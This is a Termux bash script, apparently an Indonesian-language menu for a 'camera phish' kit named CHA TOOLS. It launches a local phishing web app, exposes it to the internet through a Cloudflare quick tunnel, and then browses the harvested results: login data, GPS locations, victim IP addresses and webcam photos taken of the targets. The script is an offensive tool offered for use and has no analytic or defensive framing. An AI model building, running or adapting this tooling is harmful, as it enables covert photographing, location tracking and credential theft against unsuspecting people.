#!/data/data/com.termux/files/usr/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

clear

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}  ⚡ CHA TOOLS v1.0 ⚡${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${WHITE}  Author  : nzm${NC}"
echo -e "${WHITE}  Version : 1.0${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${GREEN}[01]${NC} CAMERA PHISH (WEBCAM + GPS)"
echo -e "${GREEN}[02]${NC} CEK HASIL (FOTO + IP + GPS)"
echo -e "${GREEN}[03]${NC} BUKA FOTO (TERMUX-VIEWER)"
echo -e "${GREEN}[04]${NC} COPY FOTO KE GALERI"
echo -e "${GREEN}[05]${NC} CEK IP TARGET"
echo -e "${GREEN}[06]${NC} HAPUS SEMUA HASIL"
echo -e "${GREEN}[00]${NC} KELUAR"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}📌 by nzm${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
read -p "➤ Pilih menu : " menu

case $menu in
    1)
        echo -e "${YELLOW}🔥 Memulai Camera Phish...${NC}"
        echo -e "${YELLOW}📌 Tekan ${GREEN}ENTER${YELLOW} untuk kembali ke menu${NC}"
        cd ~/cha-phish/"ai mamb" && python app.py > /dev/null 2>&1 & 
        sleep 4
        cloudflared tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
        CLOUD_PID=$!
        read -p ""
        echo -e "\n${YELLOW}⏹ Menghentikan tunnel...${NC}"
        kill $CLOUD_PID 2>/dev/null
        pkill -f python 2>/dev/null
        ~/cha-phish/cha-tools.sh
        ;;
    2)
        echo -e "${GREEN}▶ CEK HASIL${NC}"
        cd ~/cha-phish/"ai mamb"/captured
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}📊 DATA LOGIN + GPS${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        cat data.txt 2>/dev/null || echo "Belum ada data"
        echo ""
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        ls images/ 2>/dev/null || echo "Belum ada foto"
        echo ""
        read -p "Tekan Enter untuk kembali..."
        ~/cha-phish/cha-tools.sh
        ;;
    3)
        echo -e "${GREEN}▶ BUKA FOTO${NC}"
        cd ~/cha-phish/"ai mamb"/captured/images
        ls 2>/dev/null || echo "Belum ada foto"
        echo ""
        read -p "Masukkan nama file foto: " foto
        termux-open "$foto" 2>/dev/null || echo "File tidak ditemukan"
        read -p "Tekan Enter untuk kembali..."
        ~/cha-phish/cha-tools.sh
        ;;
    4)
        echo -e "${GREEN}▶ COPY FOTO KE GALERI${NC}"
        cp ~/cha-phish/"ai mamb"/captured/images/*.jpg /sdcard/DCIM/Camera/ 2>/dev/null
        echo -e "${GREEN}✅ Foto berhasil disalin ke galeri!${NC}"
        read -p "Tekan Enter untuk kembali..."
        ~/cha-phish/cha-tools.sh
        ;;
    5)
        echo -e "${GREEN}▶ CEK IP TARGET${NC}"
        cd ~/cha-phish/"ai mamb"/captured
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}🌐 IP TARGET TERAKHIR${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        grep -oE 'IP     : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 || echo "Belum ada data"
        echo ""
        read -p "Tekan Enter untuk kembali..."
        ~/cha-phish/cha-tools.sh
        ;;
    6)
        echo -e "${RED}▶ HAPUS SEMUA HASIL${NC}"
        rm -rf ~/cha-phish/"ai mamb"/captured/* 2>/dev/null
        echo -e "${GREEN}✅ Semua hasil berhasil dihapus!${NC}"
        read -p "Tekan Enter untuk kembali..."
        ~/cha-phish/cha-tools.sh
        ;;
    0)
        echo -e "${RED}Keluar...${NC}"
        exit
        ;;
    *)
        echo -e "${RED}❌ Pilihan salah!${NC}"
        sleep 1
        ~/cha-phish/cha-tools.sh
        ;;
esac
